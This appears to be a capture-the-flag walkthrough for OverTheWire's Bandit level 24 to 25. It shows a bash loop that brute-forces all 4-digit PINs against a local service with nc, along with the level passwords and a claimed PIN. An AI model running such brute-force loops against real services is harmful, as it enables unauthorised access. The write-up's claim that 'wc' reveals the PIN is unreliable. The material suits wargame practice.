# Level24 -> Level25

### Steps :
-  Connecting to the game using the command:
    
    ssh bandit24@bandit.labs.overthewire.org -p 2220

-  to find the level password which was stored in a personal directory:
1. Execute the script :
"#!/bin/bash
for pin in {0000..9999}; do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done |  nc localhost 30002  > /tmp/pin/file.txt"

2. Output password : iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
3. execute the command "wc /tmp/pin/file.txt", to know the pin(3947)

